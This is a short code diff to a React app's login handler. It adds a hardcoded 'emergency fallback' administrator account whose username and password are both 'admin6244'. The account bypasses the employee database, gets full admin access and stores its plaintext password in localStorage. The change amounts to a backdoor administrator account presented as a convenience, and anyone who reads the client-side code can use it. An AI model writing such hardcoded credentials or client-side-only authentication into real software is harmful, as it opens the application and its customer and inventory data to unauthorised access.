@@ -329,6 +329,26 @@ export default function App() {
 
   const handleLoginSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+
+    // 1. Hardcoded emergency fallback admin access
+    if (usernameInput.trim() === 'admin6244' && passwordInput === 'admin6244') {
+      const fallbackAdmin: EmployeeUser = {
+        id: 'fallback_admin_id_6244',
+        name: 'Super Admin',
+        username: 'admin6244',
+        password: 'admin6244', // not usually needed in state, but mapped here
+        role: 'admin',
+        allowedTabs: ['customers', 'inventory', 'performance', 'purchases']
+      };
+      setCurrentUser(fallbackAdmin);
+      localStorage.setItem('mena_inc_current_user_v3', JSON.stringify(fallbackAdmin));
+      setLoginError('');
+      setUsernameInput('');
+      setPasswordInput('');
+      return;
+    }
+
+    // 2. Standard login via database
     const user = employees.find(
       emp => emp.username.toLowerCase() === usernameInput.trim().toLowerCase()
     );
